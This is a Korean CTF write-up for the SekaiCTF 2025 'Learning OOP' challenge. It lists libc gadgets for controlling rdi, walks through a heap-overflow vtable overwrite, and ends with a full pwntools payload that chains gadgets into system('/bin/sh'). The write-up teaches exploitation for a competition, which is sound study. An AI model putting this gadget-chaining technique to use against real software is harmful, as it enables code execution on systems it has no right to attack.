`system`은 호출할 수 있는데 `rdi`를 `&"/bin/sh\x00"`로 변조할 수 없다면 2차전 시작이다. `rdi`를 변조할 수 있는 방법을 온갖 창의적인 생각과 함께 바이너리에서 찾아내야 한다. 이럴 때 보통 `libc base`는 가지고 있을 테니 쓸만한 가젯 몇 개를 정리해보겠다.

```
0x000000000009ca97 : mov rdi, qword ptr [rax + 0x640] ; call qword ptr [rax + 0x638]
0x00000000000984df : mov rdi, qword ptr [rdi + 0x10] ; call qword ptr [rax + 0x380]
0x00000000000af7b5 : mov rdi, qword ptr [rdi + 0x48] ; mov rsi, r12 ; call rax
0x0000000000085fba : mov rdi, qword ptr [rdi + 0xe0] ; call rax
0x0000000000085f7d : mov rdi, qword ptr [rdi + 0xe0] ; jmp rax
0x00000000000a1f47 : mov rdi, qword ptr [rdi + 8] ; call qword ptr [rbx]
```

특히 첫 번째, 두 번째 가젯은 힙에 있는 함수 포인터를 참조하여 실행할 때 쓰기 좋다. 예시로 2025 sekaictf의 Learning OOP라는 문제를 들어보겠다.

---
# Learning OOP

```c
void update(void)
{
  unsigned __int64 v0; // rbx
  unsigned __int64 i; // [rsp+0h] [rbp-20h]
  Animal *v3; // [rsp+8h] [rbp-18h]

  for ( i = 0LL; i <= 9; ++i )
  {
    v3 = (Animal *)pets[i];
    if ( v3 )
    {
      if ( !(unsigned int)Animal::fullness_down(v3)
        || (v0 = (int)Animal::age_up(v3), (*(__int64 (__fastcall **)(Animal *))(*(_QWORD *)v3 + 24LL))(v3) < v0) )
      {
        Animal::die(v3);
        operator delete(v3, 0x118uLL);
        pets[i] = 0LL;
        --num_pets;
      }
    }
  }
}
```

`v3`은 `heap chunk`를 가리키는 주소이다. `v3 chunk`에 `vtable`의 역할을 하는 다른 `chunk`의 주소가 있다. `*v3`에 저장되어 있는 함수 포인터를 참조하여 실행시키는 걸 알 수 있다. 이 문제에는 `heap overflow`가 있기 때문에 `vtable overwrite`는 할 수 있지만 `rdi`가 `v3`이라서 `rdi`에 `&"/bin/sh"`를 저장할 수가 없다. 

```asm
mov     rax, [rbp+var_18]
mov     rax, [rax]
add     rax, 18h
mov     rdx, [rax]
mov     rax, [rbp+var_18]
mov     rdi, rax
call    rdx
```

어셈블리어로 보면 위와 같다. 위의 분석에 따르면 `rdx, rdi, rax` 모두 `heap` 영역을 가리킨다. 따라서 `heap overflow` 취약점을 이용해서 `mov rdi, qword ptr [rdi + 0x10] ; call qword ptr [rax + 0x380]` 가젯의 `offset`을 잘 맞춰서 값을 세팅해주면 `rdi`도 변조하고 `system`도 호출할 수 있다. 아래와 같은 `payload`로 익스를 마무리했다.

```python
# (전략)

ret = l.address + 0x000000000002882f
mov_rdi_qword_ptr_rdi_0x10_call_qword_ptr_rax_0x380 = l.address + 0x00000000000984df
call_qword_ptr_rax_0x18 = l.address + 0x000000000008ac50
binsh = list(l.search(b'/bin/sh'))[0]
payload = p64(ret) * 3 + p64(mov_rdi_qword_ptr_rdi_0x10_call_qword_ptr_rax_0x380)
payload = payload.ljust(0x100, b'\x00') + p32(0) + p32(20) + p32(7) + p32(0) + p64(0x121) + p64(heap_base + 0x13a38)
payload += b'\x00' * 0x8 + p64(binsh) + p64(l.sym['system']) +  b'\x00' * 0xe8 + p32(0) + p32(20) + p32(7) + p32(0) + p64(0x121) + p64(heap_base + 0x13a38)
payload += b'\x00' * 0x100 + p32(0) + p32(20) + p32(7) + p32(0) + p64(0x121) + p64(heap_base + 0x13a38)
payload += b'\x00' * 0x100 + p32(0) + p32(20) + p32(7) + p32(0) + p64(0x121) + p64(heap_base + 0x13a38)
payload += p64(0) * 3 + p64(call_qword_ptr_rax_0x18)
print(hex(l.sym['system']))
#gdb.attach(p, '\n'.join(gdb_cmds2))
create(1, payload)
p.interactive()
```